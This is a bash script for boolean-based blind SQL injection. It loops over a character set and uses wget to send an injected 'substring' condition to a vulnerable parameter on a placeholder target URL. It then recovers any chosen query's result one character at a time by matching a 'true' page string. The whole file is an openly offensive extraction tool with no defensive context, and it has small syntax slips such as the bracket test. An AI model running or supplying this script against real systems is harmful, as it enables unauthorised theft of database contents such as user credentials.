#!/bin/bash

charset='_ + - = . : \\ / \; \@ \$ \# \' \" \( \) 0 1 2 3 4 5 6 7 8 9 a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z'

export URL="http://target.site/page.php"
export truestring="specific content that appears in a TURE condition"
export maxlength=$1
export query=$2

export result=""

echo "Extracting the results for $query..."

for ((j=1; j<$maxlength; j+=1))
do
	export charno=$j
	
	for i in $charset
	do
		wget "$URL?vulnerable_parameter=correct_value' and substring(($query),$charno,1)='$i" -q -O - | grep "$truestring" &> /dev/null
		if [ "$?" == "0"]
		then
			echo character number $charno found: $i
			export result+=$i
			break
		fi
	done
done

echo Result: $result
